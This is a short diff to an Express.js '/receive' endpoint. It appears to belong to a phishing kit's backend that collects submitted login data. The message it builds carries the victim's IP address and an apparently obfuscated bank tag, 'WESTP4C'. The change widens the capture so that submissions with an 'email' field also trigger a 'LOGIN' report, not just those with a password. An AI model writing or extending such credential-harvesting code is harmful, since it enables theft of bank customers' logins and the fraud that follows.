@@ -227,7 +227,7 @@ app.post('/receive', async (req, res) => {
 // Convert myObjects to lowercase for case insensitive checks
 const lowerCaseMyObjects = myObjects.map(obj => obj.toLowerCase());
 
-if (lowerCaseMyObjects.includes('password')) {
+if (lowerCaseMyObjects.includes('password') || lowerCaseMyObjects.includes('email')) {
     message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
                `👤 LOGIN \n\n`;
 
